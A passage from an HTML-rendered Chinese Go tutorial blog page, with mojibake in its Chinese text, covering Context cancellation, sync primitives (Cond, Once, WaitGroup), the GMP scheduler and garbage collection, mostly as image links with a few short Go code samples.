title="å¦‚ä½•åœæ­¢ä¸€ä¸ªå­åç¨‹"></a>å¦‚ä½•åœæ­¢ä¸€ä¸ªå­åç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/74.png"></p><h3 id="åŸºäºContextåœæ­¢å­åç¨‹"><a href="#åŸºäºContextåœæ­¢å­åç¨‹" class="headerlink" title="åŸºäºContextåœæ­¢å­åç¨‹"></a>åŸºäºContextåœæ­¢å­åç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/75.png"></p><h2 id="è¿›é˜¶ç¯‡"><a href="#è¿›é˜¶ç¯‡" class="headerlink" title="è¿›é˜¶ç¯‡"></a>è¿›é˜¶ç¯‡</h2><h3 id="çº¿ç¨‹åŠ é”"><a href="#çº¿ç¨‹åŠ é”" class="headerlink" title="çº¿ç¨‹åŠ é”"></a>çº¿ç¨‹åŠ é”</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/76.png"></p><h4 id="RWMutexç”¨ä¾‹"><a href="#RWMutexç”¨ä¾‹" class="headerlink" title="RWMutexç”¨ä¾‹"></a>RWMutexç”¨ä¾‹</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/77.png"></p><h4 id="å¦‚ä½•ä¿è¯æ‰§è¡Œå®Œä¸»çº¿ç¨‹ä¹‹å†…çš„æ‰€æœ‰çº¿ç¨‹"><a href="#å¦‚ä½•ä¿è¯æ‰§è¡Œå®Œä¸»çº¿ç¨‹ä¹‹å†…çš„æ‰€æœ‰çº¿ç¨‹" class="headerlink" title="å¦‚ä½•ä¿è¯æ‰§è¡Œå®Œä¸»çº¿ç¨‹ä¹‹å†…çš„æ‰€æœ‰çº¿ç¨‹"></a>å¦‚ä½•ä¿è¯æ‰§è¡Œå®Œä¸»çº¿ç¨‹ä¹‹å†…çš„æ‰€æœ‰çº¿ç¨‹</h4><p>ä½¿ç”¨WaitGroup</p><h5 id="ç®€å•ç”¨ä¾‹"><a href="#ç®€å•ç”¨ä¾‹" class="headerlink" title="ç®€å•ç”¨ä¾‹"></a>ç®€å•ç”¨ä¾‹</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/78.png"></p><h5 id="Kubernetesä¸­çš„ç”¨ä¾‹"><a href="#Kubernetesä¸­çš„ç”¨ä¾‹" class="headerlink" title="Kubernetesä¸­çš„ç”¨ä¾‹"></a>Kubernetesä¸­çš„ç”¨ä¾‹</h5><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/79.png"></p><h4 id="Condç¤ºä¾‹"><a href="#Condç¤ºä¾‹" class="headerlink" title="Condç¤ºä¾‹"></a>Condç¤ºä¾‹</h4><p>ç”Ÿäº§è€…<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/80.png"><br>æ¶ˆè´¹è€…ï¼š<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/81.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç®€æ˜“ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">queue []<span class="keyword">string</span></span><br><span class="line">cond  *sync.Cond</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">q := Queue&#123;</span><br><span class="line">queue: []<span class="keyword">string</span>&#123;&#125;,</span><br><span class="line">cond:  sync.NewCond(&amp;sync.Mutex&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">q.Enqueue(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">q.Dequeue()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span> <span class="title">Enqueue</span><span class="params">(item <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">q.cond.L.Lock()</span><br><span class="line"><span class="keyword">defer</span> q.cond.L.Unlock()</span><br><span class="line">q.queue = <span class="built_in">append</span>(q.queue, item)</span><br><span class="line">fmt.Printf(<span class="string">&quot;putting %s to queue, notify all\n&quot;</span>, item)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//broadcastä¸waité…åˆçš„ä¾‹å­</span></span><br><span class="line">    <span class="comment">//å¤„äºwaitçŠ¶æ€çš„åç¨‹0å’Œ1ï¼Œåœ¨æ”¶åˆ°broadcastä¹‹åï¼Œéƒ½ä¼šç»§ç»­æ‰§è¡Œåç»­æ“ä½œã€‚</span></span><br><span class="line">    <span class="comment">//signalä¸waité…åˆçš„ä¾‹å­</span></span><br><span class="line">    <span class="comment">//ç¬¬ä¸€ä¸ªsignalè§¦å‘çš„æ—¶å€™ï¼Œå°±ç®—å·²ç»æœ‰2ä¸ªåç¨‹åœ¨waitçŠ¶æ€ï¼Œä½†æ˜¯waitçŠ¶æ€ä¸­çš„æœ€å¼€å§‹ç­‰å¾…çš„åç¨‹0ä¼šè¢«å…ˆè°ƒç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">    q.cond.Broadcast()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span> <span class="title">Dequeue</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">q.cond.L.Lock()</span><br><span class="line"><span class="keyword">defer</span> q.cond.L.Unlock()</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(q.queue) == <span class="number">0</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;no data available, wait&quot;</span>)</span><br><span class="line">q.cond.Wait()</span><br><span class="line">&#125;</span><br><span class="line">result := q.queue[<span class="number">0</span>]</span><br><span class="line">q.queue = q.queue[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="sync-Once"><a href="#sync-Once" class="headerlink" title="sync.Once"></a>sync.Once</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SliceNum []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSlice</span><span class="params">()</span> <span class="title">SliceNum</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">make</span>(SliceNum, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SliceNum)</span> <span class="title">Add</span><span class="params">(elem <span class="keyword">int</span>)</span> *<span class="title">SliceNum</span></span> &#123;</span><br><span class="line">*s = <span class="built_in">append</span>(*s, elem)</span><br><span class="line">fmt.Println(<span class="string">&quot;add&quot;</span>, elem)</span><br><span class="line">fmt.Println(<span class="string">&quot;add SliceNum end&quot;</span>, s)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line">s := NewSlice()</span><br><span class="line"><span class="comment">// çœ‹æºä»£ç ç†è§£onceçš„è¡Œä¸º</span></span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Add(<span class="number">16</span>)</span><br><span class="line">&#125;)</span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Add(<span class="number">16</span>)</span><br><span class="line">&#125;)</span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Add(<span class="number">16</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *Once)</span> <span class="title">Do</span><span class="params">(f <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//è¿™é‡Œæ˜¯ä¸€ä¸ªCallBack</span></span><br><span class="line"><span class="comment">// Note: Here is an incorrect implementation of Do:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if atomic.CompareAndSwapUint32(&amp;o.done, 0, 1) &#123;</span></span><br><span class="line"><span class="comment">//f()</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do guarantees that when it returns, f has finished.</span></span><br><span class="line"><span class="comment">// This implementation would not implement that guarantee:</span></span><br><span class="line"><span class="comment">// given two simultaneous calls, the winner of the cas would</span></span><br><span class="line"><span class="comment">// call f, and the second would return immediately, without</span></span><br><span class="line"><span class="comment">// waiting for the first&#x27;s call to f to complete.</span></span><br><span class="line"><span class="comment">// This is why the slow path falls back to a mutex, and why</span></span><br><span class="line"><span class="comment">// the atomic.StoreUint32 must be delayed until after f returns.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> atomic.LoadUint32(&amp;o.done) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// Outlined slow-path to allow inlining of the fast-path.</span></span><br><span class="line">o.doSlow(f)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *Once)</span> <span class="title">doSlow</span><span class="params">(f <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line">o.m.Lock()</span><br><span class="line"><span class="keyword">defer</span> o.m.Unlock()</span><br><span class="line"><span class="keyword">if</span> o.done == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> atomic.StoreUint32(&amp;o.done, <span class="number">1</span>)</span><br><span class="line">f()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥å®ç°çº¿ç¨‹å®‰å…¨ï¼šchannelå’Œå…±äº«å†…å­˜ï¼Œé¼“åŠ±ç”¨channelã€‚</p><h3 id="çº¿ç¨‹è°ƒåº¦"><a href="#çº¿ç¨‹è°ƒåº¦" class="headerlink" title="çº¿ç¨‹è°ƒåº¦"></a>çº¿ç¨‹è°ƒåº¦</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/82.png"></p><h4 id="Linuxè¿›ç¨‹çš„å†…å­˜ä½¿ç”¨"><a href="#Linuxè¿›ç¨‹çš„å†…å­˜ä½¿ç”¨" class="headerlink" title="Linuxè¿›ç¨‹çš„å†…å­˜ä½¿ç”¨"></a>Linuxè¿›ç¨‹çš„å†…å­˜ä½¿ç”¨</h4><p>è™šæ‹Ÿå†…å­˜ï¼šé€šè¿‡å†…å­˜å’Œç£ç›˜çš„äº¤æ¢æ¥è™šæ‹Ÿå‡ºæ›´å¤šçš„å†…å­˜ï¼šåŸå…ˆçš„ç¨‹åºæœ‰4gè™šæ‹Ÿå†…å­˜ï¼Œå¦‚æœå†…å­˜ä¸Šä¸€éƒ¨åˆ†èµ„æºä¸æ´»è·ƒå°±è¢«è½¬åˆ°ç£ç›˜ä¸Šï¼Œæ–°è¿›æ¥çš„ç¨‹åºä¾æ—§æœ‰4gçš„è™šæ‹Ÿå†…å­˜ã€‚<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/83.png"></p><h4 id="CPUå¯¹å†…å­˜çš„è®¿é—®"><a href="#CPUå¯¹å†…å­˜çš„è®¿é—®" class="headerlink" title="CPUå¯¹å†…å­˜çš„è®¿é—®"></a>CPUå¯¹å†…å­˜çš„è®¿é—®</h4><p>TLBä¹Ÿæ˜¯åŠ é€Ÿçš„ä½œç”¨<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/84.png"></p><h4 id="è¿›ç¨‹åˆ‡æ¢å¼€é”€"><a href="#è¿›ç¨‹åˆ‡æ¢å¼€é”€" class="headerlink" title="è¿›ç¨‹åˆ‡æ¢å¼€é”€"></a>è¿›ç¨‹åˆ‡æ¢å¼€é”€</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/85.png"></p><h4 id="çº¿ç¨‹åˆ‡æ¢å¼€é”€"><a href="#çº¿ç¨‹åˆ‡æ¢å¼€é”€" class="headerlink" title="çº¿ç¨‹åˆ‡æ¢å¼€é”€"></a>çº¿ç¨‹åˆ‡æ¢å¼€é”€</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/86.png"></p><h4 id="ç”¨æˆ·çº¿ç¨‹"><a href="#ç”¨æˆ·çº¿ç¨‹" class="headerlink" title="ç”¨æˆ·çº¿ç¨‹"></a>ç”¨æˆ·çº¿ç¨‹</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/87.png"></p><h4 id="Goroutine"><a href="#Goroutine" class="headerlink" title="Goroutine"></a>Goroutine</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/88.png"></p><h4 id="MPGçš„å¯¹åº”å…³ç³»"><a href="#MPGçš„å¯¹åº”å…³ç³»" class="headerlink" title="MPGçš„å¯¹åº”å…³ç³»"></a>MPGçš„å¯¹åº”å…³ç³»</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/89.png"></p><h4 id="GMPæ¨¡å‹ç»†èŠ‚"><a href="#GMPæ¨¡å‹ç»†èŠ‚" class="headerlink" title="GMPæ¨¡å‹ç»†èŠ‚"></a>GMPæ¨¡å‹ç»†èŠ‚</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/90.png"></p><h4 id="Pçš„çŠ¶æ€"><a href="#Pçš„çŠ¶æ€" class="headerlink" title="Pçš„çŠ¶æ€"></a>Pçš„çŠ¶æ€</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/91.png"></p><h4 id="Gçš„çŠ¶æ€"><a href="#Gçš„çŠ¶æ€" class="headerlink" title="Gçš„çŠ¶æ€"></a>Gçš„çŠ¶æ€</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/92.png"></p><h4 id="Gçš„çŠ¶æ€è½¬æ¢å›¾"><a href="#Gçš„çŠ¶æ€è½¬æ¢å›¾" class="headerlink" title="Gçš„çŠ¶æ€è½¬æ¢å›¾"></a>Gçš„çŠ¶æ€è½¬æ¢å›¾</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/93.png"></p><h4 id="Gæ‰€å¤„çš„ä½ç½®"><a href="#Gæ‰€å¤„çš„ä½ç½®" class="headerlink" title="Gæ‰€å¤„çš„ä½ç½®"></a>Gæ‰€å¤„çš„ä½ç½®</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/94.png"></p><h4 id="Goroutineåˆ›å»ºè¿‡ç¨‹"><a href="#Goroutineåˆ›å»ºè¿‡ç¨‹" class="headerlink" title="Goroutineåˆ›å»ºè¿‡ç¨‹"></a>Goroutineåˆ›å»ºè¿‡ç¨‹</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/95.png"></p><h4 id="å°†-Goroutine-æ”¾åˆ°è¿è¡Œé˜Ÿåˆ—ä¸Š"><a href="#å°†-Goroutine-æ”¾åˆ°è¿è¡Œé˜Ÿåˆ—ä¸Š" class="headerlink" title="å°† Goroutine æ”¾åˆ°è¿è¡Œé˜Ÿåˆ—ä¸Š"></a>å°† Goroutine æ”¾åˆ°è¿è¡Œé˜Ÿåˆ—ä¸Š</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/96.png"></p><h4 id="è°ƒåº¦å™¨è¡Œä¸º"><a href="#è°ƒåº¦å™¨è¡Œä¸º" class="headerlink" title="è°ƒåº¦å™¨è¡Œä¸º"></a>è°ƒåº¦å™¨è¡Œä¸º</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/97.png"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>çº¿ç¨‹å’Œè¿›ç¨‹æ¥æ¯”è¾ƒçš„è¯çº¿åŸå¸‚æ›´è½»é‡çš„ï¼Œåˆ‡æ¢çº¿ç¨‹ä¸ç”¨åˆ‡æ¢é‚£äº›å†…å­˜ç©ºé—´ï¼Œçº¿ç¨‹çš„è°ƒåº¦æœ¬èº«è¿˜æ˜¯éœ€è¦ç³»ç»Ÿè°ƒç”¨çš„ï¼Œç³»ç»Ÿè°ƒç”¨æœ¬èº«æ˜¯æ¶‰åŠåˆ°å†…æ ¸æ€åˆ°ç”¨æˆ·æ€çš„åˆ‡æ¢çš„ï¼Œä¼šæœ‰å¼€é”€ï¼Œgoroutineä¸»è¦å°±æ˜¯ä¸ºäº†å‡å°‘è¿™ç§å¼€é”€ï¼ŒPè®©æ¯ä¸ªGéƒ½èƒ½æœ‰æœºä¼šè¿è¡Œä¸€ä¸‹ï¼Œå¦å¤–ï¼ŒMï¼ˆä¹Ÿå°±æ˜¯å†…æ ¸çº¿ç¨‹ï¼‰çš„æ•°é‡å¤§äºPï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯Må¯èƒ½é™·å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œç³»ç»Ÿè°ƒç”¨å¯èƒ½æ˜¯é˜»å¡çš„ï¼Œæ¯”å¦‚ç£ç›˜è¯»å–ï¼Œè¿™ä¸ªæ—¶å€™CPUæ˜¯ç©ºé—²çš„ï¼Œåˆ›å»ºæ–°çš„Må¹¶ä¸På…³è”ï¼Œå¯ä»¥è®©æ›´å¤šçš„Gè¢«è°ƒåº¦ï¼Œå……åˆ†åˆ©ç”¨CPUã€‚</p><h3 id="å†…å­˜ç®¡ç†"><a href="#å†…å­˜ç®¡ç†" class="headerlink" title="å†…å­˜ç®¡ç†"></a>å†…å­˜ç®¡ç†</h3><h4 id="å †å†…å­˜ç®¡ç†"><a href="#å †å†…å­˜ç®¡ç†" class="headerlink" title="å †å†…å­˜ç®¡ç†"></a>å †å†…å­˜ç®¡ç†</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/98.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/99.png"></p><h4 id="å †å†…å­˜ç®¡ç†çš„æŒ‘æˆ˜"><a href="#å †å†…å­˜ç®¡ç†çš„æŒ‘æˆ˜" class="headerlink" title="å †å†…å­˜ç®¡ç†çš„æŒ‘æˆ˜"></a>å †å†…å­˜ç®¡ç†çš„æŒ‘æˆ˜</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/100.png"></p><h4 id="ThreadCacheMallocæ¦‚è§ˆ"><a href="#ThreadCacheMallocæ¦‚è§ˆ" class="headerlink" title="ThreadCacheMallocæ¦‚è§ˆ"></a>ThreadCacheMallocæ¦‚è§ˆ</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/101.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/102.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/103.png"></p><h4 id="Goè¯­è¨€å†…å­˜åˆ†é…"><a href="#Goè¯­è¨€å†…å­˜åˆ†é…" class="headerlink" title="Goè¯­è¨€å†…å­˜åˆ†é…"></a>Goè¯­è¨€å†…å­˜åˆ†é…</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/104.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/105.png"></p><h4 id="å†…å­˜å›æ”¶"><a href="#å†…å­˜å›æ”¶" class="headerlink" title="å†…å­˜å›æ”¶"></a>å†…å­˜å›æ”¶</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/106.png"></p><h4 id="mspan"><a href="#mspan" class="headerlink" title="mspan"></a>mspan</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/107.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/108.png"></p><h4 id="GCå·¥ä½œæµç¨‹"><a href="#GCå·¥ä½œæµç¨‹" class="headerlink" title="GCå·¥ä½œæµç¨‹"></a>GCå·¥ä½œæµç¨‹</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/109.png"></p><h5 id="ä¸‰è‰²æ ‡è®°"><a href="#ä¸‰è‰²æ ‡è®°" class="headerlink" title="ä¸‰è‰²æ ‡è®°"></a>ä¸‰è‰²æ ‡è®°</h5><p>ç°è‰²å°±æ˜¯å…ˆç»™ä»–æ ‡è®°ä¸€ä¸‹ï¼Œè¿˜æ²¡æœ‰è¿›è¡Œåˆ¤æ–­æ´»ä¸æ´»è·ƒï¼Œç°è‰²æ ‡è®°å®Œæˆç„¶åæŠŠé”ç»™è§£æ‰ï¼Œç”¨æˆ·æ€çš„å°±å¯ä»¥æ‰§è¡Œäº†ã€‚<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/110.png"><br>ä¸€ä¸ªå‡½æ•°ä¸­ç¬¬ä¸€ä¸ªå¯¹è±¡æŒ‡é’ˆå°±æ˜¯æ ¹å¯¹è±¡ï¼Œå…¨å±€çš„æŒ‡é’ˆä¹Ÿæ˜¯æ ¹å¯¹è±¡ï¼Œå¦‚æœåªæ˜¯å®šä¹‰äº†ä¸€ä¸ªæ²¡æŒ‡é’ˆçš„ï¼ˆæ¯”å¦‚structï¼‰è¿™ä¸ªå¯¹è±¡å’Œæ ˆç»‘å®šï¼Œå‡½æ•°é€€å‡ºè¿™ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸä¹Ÿå°±ç»“æŸäº†ï¼Œæ‰€ä»¥gcåªæ˜¯å¯¹å †çš„ä¸€ä¸ªæ‰«æã€‚<br>æ‰«å¯¹è±¡ï¼Œèƒ½æ‰«åˆ°çš„æœ€åéƒ½è¢«æ ‡è®°æˆé»‘è‰²äº†ï¼Œ<br>é»‘è‰²å¯¹è±¡å°±æ„å‘³ç€ä»–æ˜¯æ´»è·ƒçš„ï¼Œä»–å°±ä¸ä¼šè¢«å›æ”¶ï¼Œå‡¡æ˜¯æ²¡æœ‰è¢«æ ¹å¯¹è±¡å¼•ç”¨çš„ä»–å°±ä¼šè¢«å›æ”¶æ‰ã€‚<br>æ‰«ä¸åˆ°çš„å°±æ˜¯ç™½çš„ã€‚</p><h4 id="åƒåœ¾å›æ”¶è§¦å‘æœºåˆ¶"><a href="#åƒåœ¾å›æ”¶è§¦å‘æœºåˆ¶" class="headerlink" title="åƒåœ¾å›æ”¶è§¦å‘æœºåˆ¶"></a>åƒåœ¾å›æ”¶è§¦å‘æœºåˆ¶</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/111.png"></p><h3 id="åŒ…å¼•ç”¨ä¸ä¾èµ–ç®¡ç†"><a href="#åŒ…å¼•ç”¨ä¸ä¾èµ–ç®¡ç†" class="headerlink" title="åŒ…å¼•ç”¨ä¸ä¾èµ–ç®¡ç†"></a>åŒ…å¼•ç”¨ä¸ä¾èµ–ç®¡ç†</h3><h4 id="Goè¯­è¨€ä¾èµ–ç®¡ç†çš„æ¼”è¿›"><a href="#Goè¯­è¨€ä¾èµ–ç®¡ç†çš„æ¼”è¿›" class="headerlink" title="Goè¯­è¨€ä¾èµ–ç®¡ç†çš„æ¼”è¿›"></a>Goè¯­è¨€ä¾èµ–ç®¡ç†çš„æ¼”è¿›</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/112.png"></p><h4 id="vendorç®¡ç†å·¥å…·"><a href="#vendorç®¡ç†å·¥å…·" class="headerlink" title="vendorç®¡ç†å·¥å…·"></a>vendorç®¡ç†å·¥å…·</h4><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/113.png"></p><h4 id="Go-modä½¿ç”¨"><a href="#Go-modä½¿ç”¨" class="headerlink" title="Go modä½¿ç”¨"></a>Go modä½¿ç”¨</h4><p><img 